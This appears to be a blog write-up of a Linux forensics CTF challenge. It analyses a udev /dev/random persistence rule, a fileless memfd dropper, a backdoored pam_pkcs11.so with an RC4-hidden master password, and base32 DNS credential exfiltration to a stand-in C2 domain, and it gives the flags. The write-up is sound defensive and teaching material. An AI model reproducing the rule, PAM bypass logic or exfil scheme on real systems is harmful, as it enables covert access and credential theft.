@@ -1,0 +1,382 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics</title>
+    <meta name="description" content="Writeup for WRAITHSTEP (OSC Regional 2026) — Linux forensics challenge: udev /dev/random persistence, PAM RC4 backdoor replacing pam_pkcs11.so, and DNS credential exfiltration via base32-encoded queries">
+    <meta property="og:title" content="WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="index.html">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>WRAITHSTEP (OSC Regional 2026) — Linux Implant Forensics</h1>
+          <p class="post-subtitle">
+            Three-stage forensics challenge built around techniques documented in real incidents: udev /dev/random persistence (sedexp, 2024), fileless execution via memfd_create (PUMAKIT, 2024), a PAM module replacing pam_pkcs11.so with an RC4-obfuscated backdoor, and DNS-tunneled credential exfiltration.
+          </p>
+          <p class="post-meta">
+            <span>Forensics • Malware Analysis</span>
+            <span>OSC Regional 2026</span>
+            <span>Challenge by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">Linux</span>
+            <span class="tag">udev</span>
+            <span class="tag">PAM</span>
+            <span class="tag">RC4</span>
+            <span class="tag">DNS Exfiltration</span>
+            <span class="tag">memfd_create</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#background">Background</a></li>
+            <li><a href="#stage1">Stage 1 — persistence vector + C2 domain (FLAG 1)</a></li>
+            <li><a href="#stage2">Stage 2 — PAM backdoor RE + master password (FLAG 2)</a></li>
+            <li><a href="#stage3">Stage 3 — DNS PCAP decode + stolen credentials (FLAG 3)</a></li>
+            <li><a href="#implant-map">Full implant execution map</a></li>
+          </ul>
+        </nav>
+
+        <section id="background">
+          <h2>Background</h2>
+          <p>The premise: security ops got an alert on a production Ubuntu 22.04 server. An engineer did a quick triage, pulled a forensic snapshot, and took the box offline. The archive contains a <code>/proc</code> snapshot, relevant filesystem files, system logs, and a DNS packet capture from the network tap.</p>
+          <p>Every technique in the implant maps to a documented real-world incident — the idea was to build something that felt like an actual post-incident analysis rather than a contrived CTF. The implant has two components: a dropper that survives reboot via a udev rule, and a malicious PAM module dropped in place of the real <code>pam_pkcs11.so</code> that intercepts SSH logins and exfiltrates credentials over DNS.</p>
+          <p>Both binaries are stripped, and both use the same 8-byte RC4 key — a deliberate choice to let you cross-confirm findings between the two stages.</p>
+        </section>
+
+        <section id="stage1">
+          <h2>Stage 1 — persistence vector + C2 domain (FLAG 1)</h2>
+
+          <h3>proc snapshot</h3>
+          <p>Start with <code>proc_snapshot/</code>, which contains a subset of <code>/proc/</code> captured at triage time. Three process directories: PID 512 (systemd-udevd), PID 1247 (SUSPECT), and PID 8834 (sshd worker for the devops session).</p>
+          <p>PID 1247 has three anomalies that stand out immediately:</p>
+          <pre><code>exe:     /memfd:dropper (deleted)
+cmdline: &lt;null bytes&gt;
+status:
+  Name:   kworker/u4:2
+  PPid:   512</code></pre>
+          <ul>
+            <li><strong><code>/memfd:dropper (deleted)</code></strong> — the process is running from an anonymous in-memory file descriptor. This is the <code>memfd_create</code> fileless execution technique — nothing touches disk, so there is no binary to recover from the filesystem. The same pattern appears in PUMAKIT (Elastic Security Labs, December 2024) and perfctl.</li>
+            <li><strong>cmdline = null bytes</strong> — argv was overwritten with <code>memset()</code>. The process is completely invisible to <code>ps</code> and <code>cat /proc/PID/cmdline</code>. The <code>Name</code> field was set to <code>kworker/u4:2</code> to blend in with real kernel threads.</li>
+            <li><strong>PPid = 512</strong> — this is the key. Real kernel threads (<code>kworker/u4:2</code> included) always have PPid = 2 (kthreadd). A <code>kworker</code> process with PPid = 512 (udevd) was spawned by a udev rule.</li>
+          </ul>
+
+          <h3>Tracing the udev rule</h3>
+          <p>Rules are in <code>etc/udev/rules.d/</code>. Three files: two standard Ubuntu entries and one that doesn't ship in any Ubuntu package:</p>
+          <pre><code># 99-apm-events.rules
+# APM device event monitoring
+ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/lib/udev/apm-events-d run"</code></pre>
+          <p><code>MAJOR=1, MINOR=8</code> is <code>/dev/random</code>. The rule fires every time the kernel initializes the random number generator at boot — meaning the dropper runs on every reboot with no cron, no systemd unit, nothing that's easy to spot in the usual persistence checklist. The <code>syslog</code> entry confirms it:</p>
+          <pre><code>Mar 15 02:09:05 prod-server01 systemd-udevd[512]: random: Process '/lib/udev/apm-events-d run' [1243] spawned for rule '/etc/udev/rules.d/99-apm-events.rules' line 3.</code></pre>
+          <p>This technique was documented by Stroz Friedberg in August 2024 as sedexp, with zero AV detections at the time of discovery.</p>
+
+          <h3>Reversing apm-events-d</h3>
+          <p>The binary at <code>lib/udev/apm-events-d</code> is a stripped x86-64 ELF. Load it in Ghidra or IDA.</p>
+          <p><strong>Finding RC4:</strong> look for a function with two loops of 256 iterations and an S-box — the classic KSA+PRGA structure. The 8-byte key is hardcoded in <code>.rodata</code>:</p>
+          <pre><code>0xde, 0xad, 0xc0, 0xde, 0xbe, 0xef, 0x13, 0x37</code></pre>
+          <p><strong>The encrypted C2 domain</strong> is a 21-byte array (<code>_c2enc</code>) also in <code>.rodata</code>:</p>
+          <pre><code>0xc5, 0x8d, 0xaa, 0xc3, 0xd2, 0xb9, 0x66, 0x52,
+0xa9, 0xf8, 0x0c, 0xa7, 0x20, 0x6d, 0xd2, 0x72,
+0xee, 0x44, 0x3b, 0x68, 0x40</code></pre>
+          <p>Decrypt it:</p>
+          <pre><code>def rc4(key, data):
+    S = list(range(256)); j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = j = 0; out = []
+    for byte in data:
+        i = (i + 1) % 256; j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(byte ^ S[(S[i] + S[j]) % 256])
+    return bytes(out)
+
+key = bytes([0xde,0xad,0xc0,0xde,0xbe,0xef,0x13,0x37])
+enc = bytes([0xc5,0x8d,0xaa,0xc3,0xd2,0xb9,0x66,0x52,
+             0xa9,0xf8,0x0c,0xa7,0x20,0x6d,0xd2,0x72,
+             0xee,0x44,0x3b,0x68,0x40])
+print(rc4(key, enc).decode())  # -> "telemetry-svc.invalid"</code></pre>
+          <p>C2 domain: <strong>telemetry-svc.invalid</strong></p>
+          <pre><code>import hashlib
+print(hashlib.sha256(b"telemetry-svc.invalid").hexdigest())
+# -> 2e277e17153ea7ba9ef9a580523b6d10c87ac31e3d64aaff2a239f1027655fba</code></pre>
+          <p><strong>FLAG 1 = <code>CTF{2e277e17153ea7ba9ef9a580523b6d10c87ac31e3d64aaff2a239f1027655fba}</code></strong></p>
+          <div class="note">
+            The same 8-byte key appears in the PAM module — both binaries were almost certainly built by the same actor from a shared codebase. Spotting that match is a useful cross-check before you start Stage 2.
+          </div>
+        </section>
+
+        <section id="stage2">
+          <h2>Stage 2 — PAM backdoor RE + master password (FLAG 2)</h2>
+
+          <h3>Detecting the malicious module</h3>
+          <p>In <code>etc/pam.d/sshd</code> there's a line added at the top of the auth section, before <code>@include common-auth</code>:</p>
+          <pre><code># PKCS#11 smart card authentication support
+auth       sufficient   pam_pkcs11.so</code></pre>
+          <p>Two things make this suspicious. The <code>sufficient</code> flag placed before <code>@include common-auth</code> means the module runs first — if it returns <code>PAM_SUCCESS</code>, authentication succeeds immediately without hitting <code>pam_unix.so</code>. If it returns <code>PAM_IGNORE</code>, the stack continues as normal and the legitimate login works fine. From a user's perspective nothing looks broken.</p>
+          <p>But <code>pam_pkcs11</code> is a real Ubuntu package (<code>libpam-pkcs11</code>). Check the MD5:</p>
+          <pre><code># from var/lib/dpkg/info/libpam-pkcs11.md5sums:
+a3f8c21d9e7b4056f1280c3a9d6e5b47  lib/security/pam_pkcs11.so
+
+# actual file on disk:
+md5sum lib/security/pam_pkcs11.so
+b4b49139c101c9f4917c382451a6a4cf  # DIFFERENT</code></pre>
+          <p>The file was replaced. The <code>dpkg.log</code> shows the real package was installed on 2025-03-14. The replacement happened the next morning — the same window as the udev rule installation.</p>
+
+          <h3>Reversing pam_pkcs11.so</h3>
+          <p>Load the file in Ghidra/IDA. After stripping, <code>pam_sm_authenticate</code> is the only symbol left — PAM loads it by name at runtime, so it can't be removed. The logic:</p>
+          <pre><code>int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, char **argv) {
+    pam_get_user(pamh, &amp;username, NULL);
+    pam_get_authtok(pamh, PAM_AUTHTOK, &amp;password, NULL);
+
+    if (check_master(password))
+        return PAM_SUCCESS;  // silent bypass
+
+    // fork + dns_exfil(username, password)
+    return PAM_IGNORE;
+}</code></pre>
+          <p><code>check_master()</code> decrypts the <code>_mp</code> array with the same RC4 key found in Stage 1 and compares the result to the supplied password. The encrypted 14-byte array:</p>
+          <pre><code>0xe6, 0x9a, 0xf2, 0x97, 0xcb, 0xb4, 0x59, 0x13,
+0xa9, 0x8a, 0x4d, 0xe1, 0x71, 0x77</code></pre>
+          <p>Decrypt with the Stage 1 key:</p>
+          <pre><code>enc_pass = bytes([0xe6,0x9a,0xf2,0x97,0xcb,0xb4,0x59,0x13,
+                  0xa9,0x8a,0x4d,0xe1,0x71,0x77])
+print(rc4(key, enc_pass).decode())  # -> "Wr41thK3y_2024"</code></pre>
+          <p>Master password: <strong>Wr41thK3y_2024</strong></p>
+          <pre><code>import hashlib
+print(hashlib.sha256(b"Wr41thK3y_2024").hexdigest())
+# -> e594987b789745aec646eb15b004df670c09f9f7bff75ae4841fa08198f0f81d</code></pre>
+          <p><strong>FLAG 2 = <code>CTF{e594987b789745aec646eb15b004df670c09f9f7bff75ae4841fa08198f0f81d}</code></strong></p>
+          <div class="note">
+            The master password gives the attacker silent root-level SSH access on demand — any login attempt with <code>Wr41thK3y_2024</code> succeeds regardless of the actual user's password, and PAM returns success before <code>pam_unix.so</code> ever gets involved. This design is documented in detail by Nextron Systems as the Plague PAM backdoor pattern (2025).
+          </div>
+        </section>
+
+        <section id="stage3">
+          <h2>Stage 3 — DNS PCAP decode + stolen credentials (FLAG 3)</h2>
+
+          <h3>Exfiltration scheme (from RE)</h3>
+          <p>After the master-password check returns false, <code>dns_exfil()</code> runs in a forked child. The scheme, recovered by reversing the function:</p>
+          <ol>
+            <li>Decrypt the C2 domain with RC4 (<code>telemetry-svc.invalid</code>)</li>
+            <li>Encode <code>username:password</code> as base32 RFC 4648, lowercase, no padding</li>
+            <li>Split the encoded string into chunks of at most 32 characters</li>
+            <li>Send DNS A queries: <code>&lt;chunk&gt;.&lt;seq&gt;.d.telemetry-svc.invalid</code></li>
+            <li>Terminate with a sentinel: <code>done.&lt;seq&gt;.d.telemetry-svc.invalid</code></li>
+          </ol>
+          <p>The parent process returns <code>PAM_IGNORE</code> immediately — the DNS queries happen asynchronously and the victim's login succeeds normally.</p>
+
+          <h3>PCAP analysis</h3>
+          <p>Open <code>pcaps/dns_exfil.pcap</code> in Wireshark. Filter:</p>
+          <pre><code>dns.qry.name contains "telemetry-svc.invalid"</code></pre>
+          <p>Three queries, all at 14:23:18 — exactly one second after the SSH login from <code>auth.log</code>:</p>
+          <pre><code>mrsxm33qom5eim3wgbyhgx2qoiygixzs.0.d.telemetry-svc.invalid
+gazdiii.1.d.telemetry-svc.invalid
+done.2.d.telemetry-svc.invalid</code></pre>
+          <p>Reassemble and decode:</p>
+          <pre><code>import base64
+
+chunks = {
+    0: "mrsxm33qom5eim3wgbyhgx2qoiygixzs",
+    1: "gazdiii"
+}
+
+full_b32 = ''.join(chunks[k] for k in sorted(chunks)).upper()
+# "MRSXM33QOM5EIM3WGBYHGX2QOIYGIXZSGAZDIII"
+pad = (8 - len(full_b32) % 8) % 8
+decoded = base64.b32decode(full_b32 + '=' * pad)
+print(decoded.decode())  # -> "devops:D3v0ps_Pr0d_2024!"</code></pre>
+          <p>Stolen credential: <strong>devops:D3v0ps_Pr0d_2024!</strong></p>
+          <pre><code>import hashlib
+print(hashlib.sha256(b"devops:D3v0ps_Pr0d_2024!").hexdigest())
+# -> 143ab34167e193d666e56dcfc971373bbb2f80a3b0e54ed7bf12ff6e1e5af094</code></pre>
+          <p><strong>FLAG 3 = <code>CTF{143ab34167e193d666e56dcfc971373bbb2f80a3b0e54ed7bf12ff6e1e5af094}</code></strong></p>
+          <div class="note">
+            DNS exfiltration survives in almost every network environment because DNS is rarely filtered outbound. The <code>.invalid</code> TLD means no upstream resolver will ever forward the query — in a real deployment the attacker runs an authoritative NS for their C2 domain and collects the labels on the server side. The technique was documented by x-c3ll and later observed in Symbiote (BlackBerry/Intezer, 2022).
+          </div>
+        </section>
+
+        <section id="implant-map">
+          <h2>Full implant execution map</h2>
+          <pre><code>Boot
+ └─ udev /dev/random add event
+     └─ /lib/udev/apm-events-d run  (pid 1243, exits)
+         └─ fork child (pid 1247)
+             ├─ masquerade: Name="kworker/u4:2", argv zeroed
+             ├─ memfd_create("dropper") -> fd 3
+             ├─ write(fd, payload_elf)
+             └─ execve("/proc/self/fd/3")  [fileless]
+                 └─ exe -> /memfd:dropper (deleted)  [ARTIFACT]
+
+SSH login: devops@prod-server01
+ └─ sshd -> PAM stack
+     └─ pam_pkcs11.so: pam_sm_authenticate()
+         ├─ check_master("D3v0ps_Pr0d_2024!") -> FALSE
+         ├─ fork child
+         │   └─ dns_exfil("devops", "D3v0ps_Pr0d_2024!")
+         │       ├─ base32("devops:D3v0ps_Pr0d_2024!") = "mrsxm33q...gazdiii"
+         │       ├─ DNS: mrsxm33qom5eim3wgbyhgx2qoiygixzs.0.d.telemetry-svc.invalid
+         │       ├─ DNS: gazdiii.1.d.telemetry-svc.invalid
+         │       └─ DNS: done.2.d.telemetry-svc.invalid
+         └─ return PAM_IGNORE  (auth continues normally)</code></pre>
+          <p>References used when designing the challenge:</p>
+          <ul>
+            <li>sedexp (LevelBlue/Stroz Friedberg, Aug 2024) — udev /dev/random persistence with zero AV detections</li>
+            <li>PUMAKIT (Elastic Security Labs, Dec 2024) — memfd_create fileless execution in a Linux rootkit</li>
+            <li>Plague PAM backdoor (Nextron Systems, Aug 2025) — PAM module intercepting authentication silently</li>
+            <li>PAM DNS exfiltration by x-c3ll — base32 credential encoding over DNS queries</li>
+            <li>Symbiote (BlackBerry/Intezer, Jun 2022) — DNS exfiltration in a production Linux implant</li>
+          </ul>
+        </section>
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
